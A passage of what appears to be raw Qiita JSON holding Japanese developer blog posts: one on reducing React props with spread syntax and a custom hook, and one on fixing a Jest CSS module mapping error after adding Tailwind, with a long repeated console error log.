<span class=\"nx\">useForm</span><span class=\"p\">,</span> <span class=\"kd\">type</span> <span class=\"nx\">SubmitHandler</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">react-hook-form</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"kd\">type</span> <span class=\"p\">{</span> <span class=\"nx\">AdditivesSearch</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../domain/AdditivesSearch</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"k\">export</span> <span class=\"kd\">const</span> <span class=\"nx\">useSearchForm</span> <span class=\"o\">=</span> <span class=\"p\">(</span>\n  <span class=\"nx\">additivesSearch</span><span class=\"p\">:</span> <span class=\"p\">(</span><span class=\"nx\">formData</span><span class=\"p\">:</span> <span class=\"nx\">AdditivesSearch</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"nb\">Promise</span><span class=\"o\">&lt;</span><span class=\"k\">void</span><span class=\"o\">&gt;</span>\n<span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"kd\">const</span> <span class=\"p\">{</span> <span class=\"nx\">handleSubmit</span><span class=\"p\">,</span> <span class=\"nx\">register</span><span class=\"p\">,</span> <span class=\"nx\">setValue</span><span class=\"p\">,</span> <span class=\"nx\">resetField</span> <span class=\"p\">}</span> <span class=\"o\">=</span>\n    <span class=\"nx\">useForm</span><span class=\"o\">&lt;</span><span class=\"nx\">AdditivesSearch</span><span class=\"o\">&gt;</span><span class=\"p\">();</span>\n\n  <span class=\"kd\">const</span> <span class=\"na\">onAdditivesSubmit</span><span class=\"p\">:</span> <span class=\"nx\">SubmitHandler</span><span class=\"o\">&lt;</span><span class=\"nx\">AdditivesSearch</span><span class=\"o\">&gt;</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"nx\">formData</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">formData</span><span class=\"p\">.</span><span class=\"nx\">have_additives</span> <span class=\"o\">===</span> <span class=\"dl\">\"</span><span class=\"s2\">0</span><span class=\"dl\">\"</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"nx\">formData</span><span class=\"p\">.</span><span class=\"nx\">additives</span> <span class=\"o\">=</span> <span class=\"dl\">\"\"</span><span class=\"p\">;</span>\n      <span class=\"nx\">formData</span><span class=\"p\">.</span><span class=\"nx\">additivesWord</span> <span class=\"o\">=</span> <span class=\"dl\">\"\"</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n    <span class=\"nf\">additivesSearch</span><span class=\"p\">(</span><span class=\"nx\">formData</span><span class=\"p\">);</span>\n  <span class=\"p\">};</span>\n\n  <span class=\"kd\">const</span> <span class=\"nx\">handleReset</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"na\">have_additives_rest</span><span class=\"p\">:</span> <span class=\"nx\">boolean</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"nf\">resetField</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">sake_name</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n    <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">have_additives_rest</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"nf\">setValue</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">have_additives</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"dl\">\"\"</span><span class=\"p\">);</span>\n    <span class=\"p\">}</span>\n    <span class=\"nf\">resetField</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">additives</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n    <span class=\"nf\">resetField</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">additivesWord</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n    <span class=\"nf\">resetField</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">maker</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n  <span class=\"p\">};</span>\n\n  <span class=\"k\">return</span> <span class=\"p\">{</span>\n    <span class=\"nx\">handleSubmit</span><span class=\"p\">,</span>\n    <span class=\"nx\">register</span><span class=\"p\">,</span>\n    <span class=\"nx\">setValue</span><span class=\"p\">,</span>\n    <span class=\"nx\">resetField</span><span class=\"p\">,</span>\n    <span class=\"nx\">onAdditivesSubmit</span><span class=\"p\">,</span>\n    <span class=\"nx\">handleReset</span><span class=\"p\">,</span>\n  <span class=\"p\">};</span>\n<span class=\"p\">};</span>\n\n</code></pre></div>\n</div>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"105:1-127:3\">\n<div class=\"code-lang\"><span class=\"bold\">App.tsx</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">useSearchForm</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">./hooks/useSearchForm.ts</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"kd\">const</span> <span class=\"nx\">searchForm</span> <span class=\"o\">=</span> <span class=\"nf\">useSearchForm</span><span class=\"p\">(</span><span class=\"nx\">additivesSearch</span><span class=\"p\">);</span>\n\n<span class=\"kd\">const</span> <span class=\"nx\">searchProps</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n    <span class=\"nx\">getData</span><span class=\"p\">,</span>\n    <span class=\"nx\">additivesSearch</span><span class=\"p\">,</span>\n    <span class=\"nx\">isDetailedFilterOpen</span><span class=\"p\">,</span>\n    <span class=\"nx\">setIsDetailedFilterOpen</span><span class=\"p\">,</span>\n    <span class=\"p\">...</span><span class=\"nx\">searchForm</span><span class=\"p\">,</span>\n    <span class=\"na\">handleReset</span><span class=\"p\">:</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"nf\">handleReset</span><span class=\"p\">(</span><span class=\"kc\">true</span><span class=\"p\">),</span>\n<span class=\"p\">};</span>\n\n<span class=\"c1\">// 省略</span>\n\n  <span class=\"k\">return </span><span class=\"p\">(</span>\n    <span class=\"p\">&lt;&gt;</span>\n      <span class=\"p\">&lt;</span><span class=\"nc\">Search</span> <span class=\"si\">{</span><span class=\"p\">...</span><span class=\"nx\">searchProps</span><span class=\"si\">}</span> <span class=\"p\">/&gt;</span>\n    <span class=\"p\">&lt;/&gt;</span>\n  <span class=\"p\">);</span>\n<span class=\"p\">}</span>\n</code></pre></div>\n</div>\n<h1 data-sourcepos=\"129:1-129:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"130:1-131:153\">スプレッド構文は配列のコピー、要素の追加で使うものと思っていましたが、オブジェクトでも使用できることがわかりました。<br>\nコンポーネントの分割することで、役割分担できて見やすいと思う一方で、分割するのが難しいとも感じました。</p>\n<h1 data-sourcepos=\"133:1-133:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"134:1-134:86\"><iframe id=\"qiita-embed-content__f513e61f07bac4e50c21e760a25f9b21\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__f513e61f07bac4e50c21e760a25f9b21\" data-content=\"https%3A%2F%2Fdeveloper.mozilla.org%2Fja%2Fdocs%2FWeb%2FJavaScript%2FReference%2FOperators%2FSpread_syntax\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"136:1-136:55\"><iframe id=\"qiita-embed-content__8a8d7ba06314603a9857f6161dc08462\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__8a8d7ba06314603a9857f6161dc08462\" data-content=\"https%3A%2F%2Fja.react.dev%2Flearn%2Fpassing-props-to-a-component\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"138:1-138:42\"><iframe id=\"qiita-embed-content__51e80a7011ddaa804a45b23d773f8412\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__51e80a7011ddaa804a45b23d773f8412\" data-content=\"https%3A%2F%2Fja.react.dev%2Freference%2Freact%2Fhooks\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\n個人で作ったプロジェクトのコンポーネント分割を行っていたところ、propsを10個以上定義する必要がありました。\nコンポーネント分割したもののpropsが多く、解決方法はないか調べたことをまとめてみました。\n\n# 問題\nコンポーネント分割した際にpropsが多くなる\n\n```tsx:App.tsx\n  return (\n    <>\n          <Search\n            getData={getData}\n            additivesSearch={additivesSearch}\n            isDetailedFilterOpen={isDetailedFilterOpen}\n            setIsDetailedFilterOpen={setIsDetailedFilterOpen}\n            handleSubmit={handleSubmit}\n            register={register}\n            setValue={setValue}\n            resetField={resetField}\n            onAdditivesSubmit={onAdditivesSubmit}\n            handleReset={() => handleReset(true)}\n          />\n    </>\n  );\n}\n```\n\n# 解決方法\n### 1.オブジェクトにまとめ、スプレッド構文`{...オブジェクト名}`を使って設定する\n```tsx:App.tsx\nconst searchProps = {\n  getData: getData,\n  additivesSearch: additivesSearch,\n  isDetailedFilterOpen: isDetailedFilterOpen,\n  setIsDetailedFilterOpen: setIsDetailedFilterOpen,\n  handleSubmit: handleSubmit,\n  register: register,\n  setValue: setValue,\n  resetField: resetField,\n  onAdditivesSubmit: onAdditivesSubmit,\n  handleReset: () => handleReset(true)\n};\n\n// 省略\n\n  return (\n    <>\n      <Search {...searchProps} />\n    </>\n  );\n}\n```\n\n**MDNより引用**\n>スプレッド (...) 構文を使うと、配列式や文字列などの反復可能オブジェクトを、0 個以上の引数（関数呼び出しの場合）や要素（配列リテラルの場合）を目的の場所に展開することができます。\n\nスプレッド構文で、オブジェクト内のプロパティを一つずつ展開できると理解しました。\n\n### 2.Custom Hooksを使う\n1の方法は`<Search {...searchProps} />`で指定することで、すっきりしましたが、propsの指定が多いことには変わりがありません。\n\nApp.tsxに定義していたSearchコンポーネント関連するものをuseSearchFormとして`CustomHooks化`しました。\n⇒Searchコンポーネント内に定義することと同じかと思いましたが、再利用できるため、カスタムフック化してみました。\n\n```ts:useSearchForm.ts\nimport { useForm, type SubmitHandler } from \"react-hook-form\";\nimport type { AdditivesSearch } from \"../domain/AdditivesSearch\";\n\nexport const useSearchForm = (\n  additivesSearch: (formData: AdditivesSearch) => Promise<void>\n) => {\n  const { handleSubmit, register, setValue, resetField } =\n    useForm<AdditivesSearch>();\n\n  const onAdditivesSubmit: SubmitHandler<AdditivesSearch> = (formData) => {\n    if (formData.have_additives === \"0\") {\n      formData.additives = \"\";\n      formData.additivesWord = \"\";\n    }\n    additivesSearch(formData);\n  };\n\n  const handleReset = (have_additives_rest: boolean) => {\n    resetField(\"sake_name\");\n    if (have_additives_rest) {\n      setValue(\"have_additives\", \"\");\n    }\n    resetField(\"additives\");\n    resetField(\"additivesWord\");\n    resetField(\"maker\");\n  };\n\n  return {\n    handleSubmit,\n    register,\n    setValue,\n    resetField,\n    onAdditivesSubmit,\n    handleReset,\n  };\n};\n\n```\n\n```tsx:App.tsx\nimport { useSearchForm } from \"./hooks/useSearchForm.ts\";\n\nconst searchForm = useSearchForm(additivesSearch);\n\nconst searchProps = {\n    getData,\n    additivesSearch,\n    isDetailedFilterOpen,\n    setIsDetailedFilterOpen,\n    ...searchForm,\n    handleReset: () => handleReset(true),\n};\n\n// 省略\n\n  return (\n    <>\n      <Search {...searchProps} />\n    </>\n  );\n}\n```\n\n# おわりに\nスプレッド構文は配列のコピー、要素の追加で使うものと思っていましたが、オブジェクトでも使用できることがわかりました。\nコンポーネントの分割することで、役割分担できて見やすいと思う一方で、分割するのが難しいとも感じました。\n\n# 参考\nhttps://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Operators/Spread_syntax\n\nhttps://ja.react.dev/learn/passing-props-to-a-component\n\nhttps://ja.react.dev/reference/react/hooks\n","coediting":false,"comments_count":0,"created_at":"2025-06-20T19:27:19+09:00","group":null,"id":"6f7fbb03681d2f532a7e","likes_count":2,"private":false,"reactions_count":0,"stocks_count":1,"tags":[{"name":"React","versions":[]},{"name":"props","versions":[]},{"name":"スプレッド構文","versions":[]}],"title":"【React】props多すぎ問題を解決したい","updated_at":"2025-06-20T19:27:19+09:00","url":"https://qiita.com/asa129/items/6f7fbb03681d2f532a7e","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":563,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:123\">tailwindcssをViteプロジェクトに適用後、テスト実行したところ表題のエラーが発生しました。</p>\n<h1 data-sourcepos=\"4:1-4:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"5:1-5:114\">ドキュメントに従ってtailwindcssを導入後、Jestを実行すると下記のエラーが発生する。</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"7:1-18:3\"><div class=\"highlight\"><pre><code>Configuration error:\n    Could not locate module ./App.css mapped as:\n    identity-obj-proxy.\n    Please check your configuration for these entries:\n    {\n      \"moduleNameMapper\": {\n        \"/\\.(css|less)$/\": \"identity-obj-proxy\"\n      },\n      \"resolver\": undefined\n    }\n</code></pre></div></div>\n<h1 data-sourcepos=\"20:1-20:8\">\n<span id=\"原因\" class=\"fragment\"></span><a href=\"#%E5%8E%9F%E5%9B%A0\"><i class=\"fa fa-link\"></i></a>原因</h1>\n<p data-sourcepos=\"21:1-21:106\"><code>jest.config.mjs</code>で定義している<code>moduleNameMapper</code>にscssやsassが含まれていなかったため</p>\n<p data-sourcepos=\"23:1-24:125\">JestはNode.js環境で動作するため、CSSを理解できないとのこと。<br>\nそのため、<code>identity-obj-proxy</code>ライブラリを使い、CSSモジュールをモックとして返していました。</p>\n<p data-sourcepos=\"26:1-27:207\">tailwindcssでは直接CSSファイルを使用するため、<code>scss</code>や<code>sass</code>の拡張子も対象となります。scssやsassを使用した場合、Jestはモック化できないよとのエラーが発生していました。<br>\n（これまでChakaUIを使用していましたが、ChakaUIはCSS-in-JSの仕組みでスタイルをJavaScriptとして処理しているため、エラーが発生していなかったようです。）</p>\n<h1 data-sourcepos=\"29:1-29:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<p data-sourcepos=\"30:1-30:70\">jestの設定を修正、identity-obj-proxyをインストールする</p>\n<div class=\"code-frame\" data-lang=\"diff_javascript\" data-sourcepos=\"32:1-45:3\">\n<div class=\"code-lang\"><span class=\"bold\">jest.config.mjs</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">export</span> <span class=\"k\">default</span> <span class=\"p\">{</span>\n  <span class=\"na\">preset</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">ts-jest</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n  <span class=\"na\">testEnvironment</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">jsdom</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n  <span class=\"na\">setupFilesAfterEnv</span><span class=\"p\">:</span> <span class=\"p\">[</span><span class=\"dl\">\"</span><span class=\"s2\">./jest.setup.ts</span><span class=\"dl\">\"</span><span class=\"p\">],</span>\n  <span class=\"na\">transform</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n    <span class=\"dl\">\"</span><span class=\"s2\">^.+</span><span class=\"se\">\\\\</span><span class=\"s2\">.(ts|tsx)$</span><span class=\"dl\">\"</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">ts-jest</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n  <span class=\"p\">},</span>\n  <span class=\"na\">moduleNameMapper</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n<span class=\"hdl\"><span class=\"o\">- </span>   <span class=\"dl\">\"</span><span class=\"se\">\\\\</span><span class=\"s2\">.(css|less)$</span><span class=\"dl\">\"</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">identity-obj-proxy</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>   <span class=\"dl\">\"</span><span class=\"se\">\\\\</span><span class=\"s2\">.(css|less|scss|sass)$</span><span class=\"dl\">\"</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">identity-obj-proxy</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n</span>  <span class=\"p\">},</span>\n<span class=\"p\">};</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"47:1-47:62\"><code>identity-obj-proxy</code>のインストールも忘れずに行う</p>\n<div class=\"code-frame\" data-lang=\"shell\" data-sourcepos=\"48:1-50:3\"><div class=\"highlight\"><pre><code>npm <span class=\"nb\">install</span> <span class=\"nt\">--save-dev</span> identity-obj-proxy\n</code></pre></div></div>\n<h1 data-sourcepos=\"52:1-52:26\">\n<span id=\"別のエラーが発生\" class=\"fragment\"></span><a href=\"#%E5%88%A5%E3%81%AE%E3%82%A8%E3%83%A9%E3%83%BC%E3%81%8C%E7%99%BA%E7%94%9F\"><i class=\"fa fa-link\"></i></a>別のエラーが発生</h1>\n<p data-sourcepos=\"53:1-53:81\">上記でエラーは解消したものの別のエラーが発生しました。</p>\n<details><summary>エラー</summary>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"57:1-222:3\"><div class=\"highlight\"><pre><code>test@asa:~/jisou/workspace/addiless-alcohol-app$ npm run test\n\n&gt; addiless-alcohol-app@0.0.0 test\n&gt; jest --verbose\n\n  console.error\n    Received `true` for a non-boolean attribute `text-3xl`.\n\n    If you want to write it to the DOM, pass a string instead: text-3xl=\"true\" or text-3xl={value.toString()}.\n\n      at validateProperty (node_modules/react-dom/cjs/react-dom-client.development.js:3078:27)     \n      at warnUnknownProperties (node_modules/react-dom/cjs/react-dom-client.development.js:3154:9) \n      at validatePropertiesInDevelopment (node_modules/react-dom/cjs/react-dom-client.development.js:17117:9)\n      at setInitialProperties (node_modules/react-dom/cjs/react-dom-client.development.js:17741:7) \n      at completeWork (node_modules/react-dom/cjs/react-dom-client.development.js:11391:18)\n      at runWithFiberInDEV (node_modules/react-dom/cjs/react-dom-client.development.js:1522:13)\n      at completeUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15268:19)  \n      at performUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15149:11)   \n      at workLoopSync (node_modules/react-dom/cjs/react-dom-client.development.js:14956:41)        \n      at renderRootSync (node_modules/react-dom/cjs/react-dom-client.development.js:14936:11)      \n      at performWorkOnRoot (node_modules/react-dom/cjs/react-dom-client.development.js:14419:13)   \n      at performWorkOnRootViaSchedulerTask (node_modules/react-dom/cjs/react-dom-client.development.js:16216:7)\n      at performWorkUntilDeadline (node_modules/scheduler/cjs/scheduler.development.js:45:48)      \n      at Timeout.task [as _onTimeout] (node_modules/jsdom/lib/jsdom/browser/Window.js:520:19)      \n\n  console.error\n    Received `true` for a non-boolean attribute `font-bold`.                                       \n                                                                                                   \n    If you want to write it to the DOM, pass a string instead: font-bold=\"true\" or font-bold={value.toString()}.                                                                                      \n                                                                                                   \n      at validateProperty (node_modules/react-dom/cjs/react-dom-client.development.js:3078:27)     \n      at warnUnknownProperties (node_modules/react-dom/cjs/react-dom-client.development.js:3154:9) \n      at validatePropertiesInDevelopment (node_modules/react-dom/cjs/react-dom-client.development.js:17117:9)                                                                                         \n      at setInitialProperties (node_modules/react-dom/cjs/react-dom-client.development.js:17741:7) \n      at completeWork (node_modules/react-dom/cjs/react-dom-client.development.js:11391:18)        \n      at runWithFiberInDEV (node_modules/react-dom/cjs/react-dom-client.development.js:1522:13)    \n      at completeUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15268:19)  \n      at performUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15149:11)   \n      at workLoopSync (node_modules/react-dom/cjs/react-dom-client.development.js:14956:41)        \n      at renderRootSync (node_modules/react-dom/cjs/react-dom-client.development.js:14936:11)      \n      at performWorkOnRoot (node_modules/react-dom/cjs/react-dom-client.development.js:14419:13)   \n      at performWorkOnRootViaSchedulerTask (node_modules/react-dom/cjs/react-dom-client.development.js:16216:7)\n      at performWorkUntilDeadline (node_modules/scheduler/cjs/scheduler.development.js:45:48)      \n      at Timeout.task [as _onTimeout] (node_modules/jsdom/lib/jsdom/browser/Window.js:520:19)      \n\n  console.error\n    Received `true` for a non-boolean attribute `text-3xl`.\n\n    If you want to write it to the DOM, pass a string instead: text-3xl=\"true\" or text-3xl={value.toString()}.\n\n      at validateProperty (node_modules/react-dom/cjs/react-dom-client.development.js:3078:27)     \n      at warnUnknownProperties (node_modules/react-dom/cjs/react-dom-client.development.js:3154:9) \n      at validatePropertiesInDevelopment (node_modules/react-dom/cjs/react-dom-client.development.js:17117:9)\n      at setInitialProperties (node_modules/react-dom/cjs/react-dom-client.development.js:17741:7) \n      at completeWork (node_modules/react-dom/cjs/react-dom-client.development.js:11391:18)        \n      at runWithFiberInDEV (node_modules/react-dom/cjs/react-dom-client.development.js:1522:13)    \n      at completeUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15268:19)  \n      at performUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15149:11)   \n      at workLoopSync (node_modules/react-dom/cjs/react-dom-client.development.js:14956:41)        \n      at renderRootSync (node_modules/react-dom/cjs/react-dom-client.development.js:14936:11)      \n      at performWorkOnRoot (node_modules/react-dom/cjs/react-dom-client.development.js:14419:13)   \n      at performWorkOnRootViaSchedulerTask (node_modules/react-dom/cjs/react-dom-client.development.js:16216:7)\n      at performWorkUntilDeadline (node_modules/scheduler/cjs/scheduler.development.js:45:48)      \n      at Timeout.task [as _onTimeout] (node_modules/jsdom/lib/jsdom/browser/Window.js:520:19)      \n\n  console.error\n    Received `true` for a non-boolean attribute `font-bold`.                                       \n                                                                                                   \n    If you want to write it to the DOM, pass a string instead: font-bold=\"true\" or font-bold={value.toString()}.                                                                                      \n                                                                                                   \n      at validateProperty (node_modules/react-dom/cjs/react-dom-client.development.js:3078:27)     \n      at warnUnknownProperties (node_modules/react-dom/cjs/react-dom-client.development.js:3154:9) \n      at validatePropertiesInDevelopment (node_modules/react-dom/cjs/react-dom-client.development.js:17117:9)                                                                                         \n      at setInitialProperties (node_modules/react-dom/cjs/react-dom-client.development.js:17741:7) \n      at completeWork (node_modules/react-dom/cjs/react-dom-client.development.js:11391:18)        \n      at runWithFiberInDEV (node_modules/react-dom/cjs/react-dom-client.development.js:1522:13)    \n      at completeUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15268:19)  \n      at performUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15149:11)   \n      at workLoopSync (node_modules/react-dom/cjs/react-dom-client.development.js:14956:41)        \n      at renderRootSync (node_modules/react-dom/cjs/react-dom-client.development.js:14936:11)      \n      at performWorkOnRoot (node_modules/react-dom/cjs/react-dom-client.development.js:14419:13)   \n      at performWorkOnRootViaSchedulerTask (node_modules/react-dom/cjs/react-dom-client.development.js:16216:7)\n      at performWorkUntilDeadline (node_modules/scheduler/cjs/scheduler.development.js:45:48)      \n      at Timeout.task [as _onTimeout] (node_modules/jsdom/lib/jsdom/browser/Window.js:520:19)      \n\n  console.error\n    Received `true` for a non-boolean attribute `text-3xl`.\n\n    If you want to write it to the DOM, pass a string instead: text-3xl=\"true\" or text-3xl={value.toString()}.\n\n      at validateProperty (node_modules/react-dom/cjs/react-dom-client.development.js:3078:27)     \n      at warnUnknownProperties (node_modules/react-dom/cjs/react-dom-client.development.js:3154:9) \n      at validatePropertiesInDevelopment (node_modules/react-dom/cjs/react-dom-client.development.js:17117:9)\n      at setInitialProperties (node_modules/react-dom/cjs/react-dom-client.development.js:17741:7) \n      at completeWork (node_modules/react-dom/cjs/react-dom-client.development.js:11391:18)        \n      at runWithFiberInDEV (node_modules/react-dom/cjs/react-dom-client.development.js:1522:13)    \n      at completeUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15268:19)  \n      at performUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15149:11)   \n      at workLoopSync (node_modules/react-dom/cjs/react-dom-client.development.js:14956:41)        \n      at renderRootSync (node_modules/react-dom/cjs/react-dom-client.development.js:14936:11)      \n      at performWorkOnRoot (node_modules/react-dom/cjs/react-dom-client.development.js:14419:13)   \n      at performWorkOnRootViaSchedulerTask (node_modules/react-dom/cjs/react-dom-client.development.js:16216:7)\n      at performWorkUntilDeadline (node_modules/scheduler/cjs/scheduler.development.js:45:48)      \n      at Timeout.task [as _onTimeout] (node_modules/jsdom/lib/jsdom/browser/Window.js:520:19)      \n\n  console.error\n    Received `true` for a non-boolean attribute `font-bold`.                                       \n                                                                                                   \n    If you want to write it to the DOM, pass a string instead: font-bold=\"true\" or font-bold={value.toString()}.                                                                                      \n                                                                                                   \n      at validateProperty (node_modules/react-dom/cjs/react-dom-client.development.js:3078:27)     \n      at warnUnknownProperties (node_modules/react-dom/cjs/react-dom-client.development.js:3154:9) \n      at validatePropertiesInDevelopment (node_modules/react-dom/cjs/react-dom-client.development.js:17117:9)                                                                                         \n      at setInitialProperties (node_modules/react-dom/cjs/react-dom-client.development.js:17741:7) \n      at completeWork (node_modules/react-dom/cjs/react-dom-client.development.js:11391:18)        \n      at runWithFiberInDEV (node_modules/react-dom/cjs/react-dom-client.development.js:1522:13)    \n      at completeUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15268:19)  \n      at performUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15149:11)   \n      at workLoopSync (node_modules/react-dom/cjs/react-dom-client.development.js:14956:41)        \n      at renderRootSync (node_modules/react-dom/cjs/react-dom-client.development.js:14936:11)      \n      at performWorkOnRoot (node_modules/react-dom/cjs/react-dom-client.development.js:14419:13)   \n      at performWorkOnRootViaSchedulerTask (node_modules/react-dom/cjs/react-dom-client.development.js:16216:7)\n      at performWorkUntilDeadline (node_modules/scheduler/cjs/scheduler.development.js:45:48)      \n      at Timeout.task [as _onTimeout] (node_modules/jsdom/lib/jsdom/browser/Window.js:520:19)      \n\n  console.error\n    Received `true` for a non-boolean attribute `text-3xl`.\n\n    If you want to write it to the DOM, pass a string instead: text-3xl=\"true\" or text-3xl={value.toString()}.\n\n      at validateProperty (node_modules/react-dom/cjs/react-dom-client.development.js:3078:27)     \n      at warnUnknownProperties (node_modules/react-dom/cjs/react-dom-client.development.js:3154:9) \n      at validatePropertiesInDevelopment (node_modules/react-dom/cjs/react-dom-client.development.js:17117:9)\n      at setInitialProperties (node_modules/react-dom/cjs/react-dom-client.development.js:17741:7) \n      at completeWork (node_modules/react-dom/cjs/react-dom-client.development.js:11391:18)        \n      at runWithFiberInDEV (node_modules/react-dom/cjs/react-dom-client.development.js:1522:13)    \n      at completeUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15268:19)  \n      at performUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15149:11)   \n      at workLoopSync (node_modules/react-dom/cjs/react-dom-client.development.js:14956:41)        \n      at renderRootSync (node_modules/react-dom/cjs/react-dom-client.development.js:14936:11)      \n      at performWorkOnRoot (node_modules/react-dom/cjs/react-dom-client.development.js:14419:13)   \n      at performWorkOnRootViaSchedulerTask (node_modules/react-dom/cjs/react-dom-client.development.js:16216:7)\n      at performWorkUntilDeadline (node_modules/scheduler/cjs/scheduler.development.js:45:48)      \n      at Timeout.task [as _onTimeout] (node_modules/jsdom/lib/jsdom/browser/Window.js:520:19)      \n\n  console.error\n    Received `true` for a non-boolean attribute `font-bold`.                                       \n                                                                                                   \n    If you want to write it to the DOM, pass a string instead: font-bold=\"true\" or font-bold={value.toString()}.                                                                                      \n                                                                                                   \n      at validateProperty (node_modules/react-dom/cjs/react-dom-client.development.js:3078:27)     \n      at warnUnknownProperties (node_modules/react-dom/cjs/react-dom-client.development.js:3154:9) \n      at validatePropertiesInDevelopment (node_modules/react-dom/cjs/react-dom-client.development.js:17117:9)                                                                                         \n      at setInitialProperties (node_modules/react-dom/cjs/react-dom-client.development.js:17741:7) \n      at completeWork (node_modules/react-dom/cjs/react-dom-client.development.js:11391:18)        \n      at runWithFiberInDEV 